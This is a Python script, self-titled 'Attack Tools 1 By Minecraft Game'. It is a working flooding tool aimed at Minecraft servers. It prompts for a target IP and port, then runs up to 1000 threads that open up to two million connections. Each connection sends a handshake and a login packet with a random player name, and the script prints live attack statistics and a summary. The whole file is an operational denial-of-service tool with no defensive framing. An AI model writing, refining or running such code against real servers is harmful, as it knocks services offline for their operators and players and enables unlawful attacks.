import socket
import threading
import random
import time
import struct
import sys

MAX_CONNECTIONS = 2000000
CONCURRENT_THREADS = 500
CONNECTION_TIMEOUT = 4
STATS_REFRESH = 5

def create_handshake(host, port):
    host_enc = host.encode('utf-8')
    return (
        struct.pack('>B', 0) +
        struct.pack('>I', 404) +
        struct.pack('>B', len(host_enc)) + host_enc +
        struct.pack('>H', port) +
        struct.pack('>B', 2)
    )

def create_login_packet():
    username = f"Player_{random.randint(10000000, 99999999)}".encode()
    return (
        struct.pack('>B', 0) +
        struct.pack('>B', len(username)) + username
    )

def attack_worker(ip, port, stats):
    while stats['total'] < MAX_CONNECTIONS and not stats['stop']:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(CONNECTION_TIMEOUT)
                sock.connect((ip, port))
                sock.send(create_handshake(ip, port))
                sock.send(create_login_packet())
                time.sleep(0.7)
                with stats['lock']:
                    stats['success'] += 1
                    stats['total'] += 1
        except Exception:
            with stats['lock']:
                stats['errors'] += 1
                stats['total'] += 1
        finally:
            time.sleep(0.05)

def main():
    print("╔" + "═"*58 + "╗")
    print("║" + f"{'Attack Tools 1 By Minecraft Game':^58}" + "║")
    print("╚" + "═"*58 + "╝")
    
    target_ip = input(">> Enter Server IP: ").strip()
    target_port = int(input(">> Enter Port [25565]: ").strip() or 25565)
    threads = int(input(f">> Threads [1-1000, default {CONCURRENT_THREADS}]: ").strip() or CONCURRENT_THREADS)
    threads = max(1, min(1000, threads))
    
    print(f"\n[!] Targeting {target_ip}:{target_port} with {threads:,} threads")
    print("[!] Press CTRL+C to stop attack\n")
    
    stats = {
        'start': time.time(),
        'total': 0,
        'success': 0,
        'errors': 0,
        'stop': False,
        'lock': threading.Lock()
    }
    
    for _ in range(threads):
        threading.Thread(
            target=attack_worker,
            args=(target_ip, target_port, stats),
            daemon=True
        ).start()
    
    try:
        while not stats['stop'] and stats['total'] < MAX_CONNECTIONS:
            time.sleep(STATS_REFRESH)
            elapsed = time.time() - stats['start']
            rate = stats['total'] / max(elapsed, 1)
            print(
                f"[{int(elapsed)}s] "
                f"Connections: {stats['total']:,}/{MAX_CONNECTIONS:,} | "
                f"Success: {stats['success']:,} | "
                f"Errors: {stats['errors']:,} | "
                f"Rate: {rate:.1f}/sec"
            )
    except KeyboardInterrupt:
        stats['stop'] = True
        print("\n[!] Stopping attack...")
    
    elapsed = time.time() - stats['start']
    print("\n╔" + "═"*58 + "╗")
    print("║" + f"{'ATTACK SUMMARY':^58}" + "║")
    print("╠" + "═"*58 + "╣")
    print(f"║ Target: {target_ip}:{target_port}")
    print(f"║ Duration: {int(elapsed)} seconds")
    print(f"║ Successful connections: {stats['success']:,}")
    print(f"║ Failed connections: {stats['errors']:,}")
    print(f"║ Connection rate: {stats['total']/max(elapsed,1):.1f}/sec")
    print("╚" + "═"*58 + "╝")

if __name__ == "__main__":
    main()